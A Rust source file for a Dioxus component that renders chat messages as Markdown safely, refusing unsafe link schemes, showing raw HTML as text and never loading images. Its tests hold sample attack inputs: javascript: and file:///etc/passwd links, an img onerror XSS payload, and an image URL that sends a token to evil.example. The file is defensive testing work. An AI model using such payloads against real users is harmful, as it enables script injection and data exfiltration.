//! Conversation messages rendered as Markdown (2026-10-14): what an agent
//! or a person writes reads as text with structure — headings, lists,
//! tables, code, links, emphasis — instead of one plain block.
//!
//! The parse ([`parse`]) is pure and tested; the component ([`Markdown`])
//! only draws its tree. It is safe by construction, because a message is
//! **content, not authority** (the security rules in `Security.md`):
//! - raw HTML is shown as text, never interpreted;
//! - a link keeps its target only for `http`, `https`, `mailto` and
//!   relative paths; any other scheme (`javascript:`, `data:`, `file:` …)
//!   becomes plain text;
//! - **images are never loaded**: a remote image in an agent's reply is a
//!   way to send data out (the URL carries it). It shows as a link the
//!   user can choose to open;
//! - math (`$…$`, `$$…$$`) is kept as its source, styled as math, until the
//!   shared math renderer exists (`Math Delimiters and Renderers.md`).

use dioxus::prelude::*;
use pulldown_cmark::{CodeBlockKind, Event, HeadingLevel, Options, Parser, Tag};

/// One node of a parsed message.
#[derive(Clone, Debug, PartialEq)]
pub enum Node {
    Text(String),
    /// Inline code.
    Code(String),
    /// Math source, inline (`false`) or display (`true`).
    Math(String, bool),
    SoftBreak,
    HardBreak,
    Rule,
    Paragraph(Vec<Node>),
    Heading(u8, Vec<Node>),
    Quote(Vec<Node>),
    /// A fenced or indented code block: its language (if fenced) and text.
    CodeBlock(Option<String>, String),
    /// A list: its start number when ordered, and its items.
    List(Option<u64>, Vec<Node>),
    Item(Vec<Node>),
    /// A task-list checkbox, checked or not.
    Task(bool),
    Emphasis(Vec<Node>),
    Strong(Vec<Node>),
    Strike(Vec<Node>),
    /// A link with an allowed target.
    Link(String, Vec<Node>),
    /// An image, never loaded: its URL (allowed or not) and its alt text.
    Image(String, String),
    Table(Vec<Node>),
    /// A table row; `true` for the header row.
    Row(bool, Vec<Node>),
    Cell(Vec<Node>),
}

/// Whether a link target may stay a link: web, mail, or a relative path
/// (a note, `#anchor`). Everything with another scheme is refused.
pub fn allowed(href: &str) -> bool {
    let h = href.trim();
    let lower = h.to_ascii_lowercase();
    if lower.starts_with("http://") || lower.starts_with("https://") || lower.starts_with("mailto:")
    {
        return true;
    }
    // A scheme is letters/digits/+.- before the first ':' that comes before
    // any '/', '?' or '#'.
    match h.find(':') {
        None => true,
        Some(colon) => h[..colon].contains(['/', '?', '#']),
    }
}

/// The message's tree (GitHub-flavoured: tables, strikethrough, task
/// lists; math kept as source).
pub fn parse(text: &str) -> Vec<Node> {
    let opts = Options::ENABLE_TABLES
        | Options::ENABLE_STRIKETHROUGH
        | Options::ENABLE_TASKLISTS
        | Options::ENABLE_MATH;
    // A stack of open containers: (what closes it, its children).
    let mut stack: Vec<(Open, Vec<Node>)> = vec![(Open::Root, Vec::new())];
    let push = |stack: &mut Vec<(Open, Vec<Node>)>, n: Node| {
        if let Some(top) = stack.last_mut() {
            top.1.push(n);
        }
    };
    for ev in Parser::new_ext(text, opts) {
        match ev {
            Event::Start(tag) => {
                let open = match tag {
                    Tag::Paragraph => Open::Paragraph,
                    Tag::Heading { level, .. } => Open::Heading(match level {
                        HeadingLevel::H1 => 1,
                        HeadingLevel::H2 => 2,
                        HeadingLevel::H3 => 3,
                        HeadingLevel::H4 => 4,
                        HeadingLevel::H5 => 5,
                        HeadingLevel::H6 => 6,
                    }),
                    Tag::BlockQuote(_) => Open::Quote,
                    Tag::CodeBlock(kind) => Open::CodeBlock(match kind {
                        CodeBlockKind::Fenced(lang) if !lang.is_empty() => Some(lang.to_string()),
                        _ => None,
                    }),
                    Tag::List(start) => Open::List(start),
                    Tag::Item => Open::Item,
                    Tag::Emphasis => Open::Emphasis,
                    Tag::Strong => Open::Strong,
                    Tag::Strikethrough => Open::Strike,
                    Tag::Link { dest_url, .. } => Open::Link(dest_url.to_string()),
                    Tag::Image { dest_url, .. } => Open::Image(dest_url.to_string()),
                    Tag::Table(_) => Open::Table,
                    Tag::TableHead => Open::Row(true),
                    Tag::TableRow => Open::Row(false),
                    Tag::TableCell => Open::Cell,
                    // HTML blocks, footnotes, metadata: their text still
                    // arrives as events, and lands in the current container.
                    _ => Open::Transparent,
                };
                stack.push((open, Vec::new()));
            }
            Event::End(_) => {
                // The stack, not the end tag, says what closed.
                // Close the innermost container (pulldown-cmark balances them).
                let Some((open, children)) = stack.pop() else {
                    continue;
                };
                let node = match open {
                    Open::Root => {
                        stack.push((Open::Root, children));
                        continue;
                    }
                    Open::Paragraph => Node::Paragraph(children),
                    Open::Heading(l) => Node::Heading(l, children),
                    Open::Quote => Node::Quote(children),
                    Open::CodeBlock(lang) => Node::CodeBlock(lang, plain(&children)),
                    Open::List(start) => Node::List(start, children),
                    Open::Item => Node::Item(children),
                    Open::Emphasis => Node::Emphasis(children),
                    Open::Strong => Node::Strong(children),
                    Open::Strike => Node::Strike(children),
                    Open::Link(href) => {
                        if allowed(&href) {
                            Node::Link(href, children)
                        } else {
                            // The text stays; the target goes.
                            for c in children {
                                push(&mut stack, c);
                            }
                            continue;
                        }
                    }
                    Open::Image(src) => Node::Image(src, plain(&children)),
                    Open::Table => Node::Table(children),
                    Open::Row(head) => Node::Row(head, children),
                    Open::Cell => Node::Cell(children),
                    Open::Transparent => {
                        for c in children {
                            push(&mut stack, c);
                        }
                        continue;
                    }
                };
                push(&mut stack, node);
            }
            Event::Text(t) => push(&mut stack, Node::Text(t.to_string())),
            Event::Code(t) => push(&mut stack, Node::Code(t.to_string())),
            Event::InlineMath(t) => push(&mut stack, Node::Math(t.to_string(), false)),
            Event::DisplayMath(t) => push(&mut stack, Node::Math(t.to_string(), true)),
            // Raw HTML is shown, never interpreted.
            Event::Html(t) | Event::InlineHtml(t) => push(&mut stack, Node::Text(t.to_string())),
            Event::SoftBreak => push(&mut stack, Node::SoftBreak),
            Event::HardBreak => push(&mut stack, Node::HardBreak),
            Event::Rule => push(&mut stack, Node::Rule),
            Event::TaskListMarker(done) => push(&mut stack, Node::Task(done)),
            Event::FootnoteReference(t) => push(&mut stack, Node::Text(format!("[{t}]"))),
        }
    }
    // Anything left open (it shouldn't be) is flattened into the root.
    let mut root = Vec::new();
    for (_, children) in stack {
        root.extend(children);
    }
    root
}

/// What a container on the parse stack is.
enum Open {
    Root,
    Paragraph,
    Heading(u8),
    Quote,
    CodeBlock(Option<String>),
    List(Option<u64>),
    Item,
    Emphasis,
    Strong,
    Strike,
    Link(String),
    Image(String),
    Table,
    Row(bool),
    Cell,
    Transparent,
}

/// The plain text under some nodes (a code block's lines, an image's alt).
fn plain(nodes: &[Node]) -> String {
    let mut out = String::new();
    for n in nodes {
        match n {
            Node::Text(t) | Node::Code(t) | Node::Math(t, _) => out.push_str(t),
            Node::SoftBreak | Node::HardBreak => out.push('\n'),
            Node::Paragraph(c)
            | Node::Heading(_, c)
            | Node::Quote(c)
            | Node::Item(c)
            | Node::Emphasis(c)
            | Node::Strong(c)
            | Node::Strike(c)
            | Node::Link(_, c)
            | Node::Cell(c) => out.push_str(&plain(c)),
            _ => {}
        }
    }
    out
}

/// A message, drawn from its parsed tree.
#[component]
pub fn Markdown(text: String) -> Element {
    let nodes = parse(&text);
    rsx! {
        div { class: "mk-md",
            for (i, n) in nodes.iter().enumerate() {
                Draw { key: "{i}", node: n.clone() }
            }
        }
    }
}

#[component]
fn Draw(node: Node) -> Element {
    let kids = |c: &[Node]| {
        let c = c.to_vec();
        rsx! {
            for (i, n) in c.into_iter().enumerate() {
                Draw { key: "{i}", node: n }
            }
        }
    };
    match &node {
        Node::Text(t) => rsx! { "{t}" },
        Node::Code(t) => rsx! { code { "{t}" } },
        Node::Math(t, false) => rsx! { span { class: "mk-md-math", "{t}" } },
        Node::Math(t, true) => rsx! { div { class: "mk-md-math mk-md-math-block", "{t}" } },
        Node::SoftBreak => rsx! { " " },
        Node::HardBreak => rsx! { br {} },
        Node::Rule => rsx! { hr {} },
        Node::Paragraph(c) => rsx! { p { {kids(c)} } },
        Node::Heading(1, c) => rsx! { h3 { {kids(c)} } },
        Node::Heading(2, c) => rsx! { h4 { {kids(c)} } },
        Node::Heading(_, c) => rsx! { h5 { {kids(c)} } },
        Node::Quote(c) => rsx! { blockquote { {kids(c)} } },
        Node::CodeBlock(lang, text) => rsx! {
            pre { class: "mk-md-code", "data-lang": lang.clone().unwrap_or_default(), code { "{text}" } }
        },
        Node::List(Some(start), c) => rsx! { ol { start: "{start}", {kids(c)} } },
        Node::List(None, c) => rsx! { ul { {kids(c)} } },
        Node::Item(c) => rsx! { li { {kids(c)} } },
        Node::Task(done) => rsx! { input { r#type: "checkbox", checked: *done, disabled: true } },
        Node::Emphasis(c) => rsx! { em { {kids(c)} } },
        Node::Strong(c) => rsx! { strong { {kids(c)} } },
        Node::Strike(c) => rsx! { del { {kids(c)} } },
        Node::Link(href, c) => rsx! {
            a { href: "{href}", target: "_blank", rel: "noopener noreferrer nofollow", {kids(c)} }
        },
        Node::Image(src, alt) => {
            let label = if alt.is_empty() {
                "image".to_string()
            } else {
                format!("image: {alt}")
            };
            if allowed(src) {
                rsx! { a { class: "mk-md-image", href: "{src}", target: "_blank", rel: "noopener noreferrer nofollow", title: "{src}", "[{label}]" } }
            } else {
                rsx! { span { class: "mk-md-image", title: "{src}", "[{label}]" } }
            }
        }
        Node::Table(c) => rsx! { table { {kids(c)} } },
        Node::Row(true, c) => rsx! { thead { tr { {kids(c)} } } },
        Node::Row(false, c) => rsx! { tr { {kids(c)} } },
        Node::Cell(c) => rsx! { td { {kids(c)} } },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn structure_survives() {
        let n = parse(
            "# Plan\n\n1. **read** the file\n2. run `cargo test`\n\n```rust\nfn main() {}\n```\n",
        );
        assert!(matches!(&n[0], Node::Heading(1, _)));
        let Node::List(Some(1), items) = &n[1] else {
            panic!("{n:?}")
        };
        assert_eq!(items.len(), 2);
        assert_eq!(
            n[2],
            Node::CodeBlock(Some("rust".into()), "fn main() {}\n".into())
        );
    }

    #[test]
    fn links_keep_only_safe_targets() {
        assert!(allowed("https://example.org/a?b"));
        assert!(allowed("mailto:a@b.c"));
        assert!(allowed("notes/Home.md"));
        assert!(allowed("#section"));
        assert!(allowed("a/b:c")); // a colon after a slash is not a scheme
        assert!(!allowed("javascript:alert(1)"));
        assert!(!allowed(" JavaScript:alert(1)"));
        assert!(!allowed("data:text/html,<b>x</b>"));
        assert!(!allowed("file:///etc/passwd"));
        let n = parse("[ok](https://x.org) and [bad](javascript:alert(1))");
        let Node::Paragraph(p) = &n[0] else { panic!() };
        assert!(matches!(&p[0], Node::Link(h, _) if h == "https://x.org"));
        // The bad link's text stays as text, without a target.
        assert!(p.iter().any(|x| x == &Node::Text("bad".into())));
        assert!(!p
            .iter()
            .any(|x| matches!(x, Node::Link(h, _) if h.starts_with("javascript"))));
    }

    #[test]
    fn html_is_text_and_images_are_never_loaded() {
        let n = parse("<img src=x onerror=alert(1)>\n\n![secret](https://evil.example/?q=TOKEN)");
        let Node::Text(t) = &n[0] else {
            panic!("{n:?}")
        };
        assert!(t.contains("<img"), "raw HTML shown as text");
        let Node::Paragraph(p) = &n[1] else {
            panic!("{n:?}")
        };
        assert_eq!(
            p[0],
            Node::Image("https://evil.example/?q=TOKEN".into(), "secret".into())
        );
    }

    #[test]
    fn tables_tasks_and_math() {
        let n = parse(
            "| a | b |\n|---|---|\n| 1 | 2 |\n\n- [x] done\n- [ ] open\n\nthe mean is $\\mu$\n",
        );
        let Node::Table(rows) = &n[0] else {
            panic!("{n:?}")
        };
        assert!(matches!(&rows[0], Node::Row(true, cells) if cells.len() == 2));
        assert!(matches!(&rows[1], Node::Row(false, cells) if cells.len() == 2));
        let Node::List(None, items) = &n[1] else {
            panic!("{n:?}")
        };
        assert!(matches!(&items[0], Node::Item(c) if c.first() == Some(&Node::Task(true))));
        let Node::Paragraph(p) = &n[2] else {
            panic!("{n:?}")
        };
        assert!(p.contains(&Node::Math("\\mu".into(), false)));
    }
}
